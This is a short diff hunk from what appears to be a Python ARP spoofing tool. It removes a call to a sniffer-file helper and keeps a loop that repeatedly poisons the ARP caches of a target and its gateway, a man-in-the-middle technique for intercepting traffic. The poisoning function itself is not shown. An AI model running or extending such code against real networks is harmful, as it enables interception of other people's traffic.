@@ -49,7 +49,6 @@ gateway_ip = ips.gateway_ip
 
 
 try:
-    snifferFileOpener()
     while True:
         arp_poisoning(target_ip,gateway_ip);
         arp_poisoning(gateway_ip,target_ip);
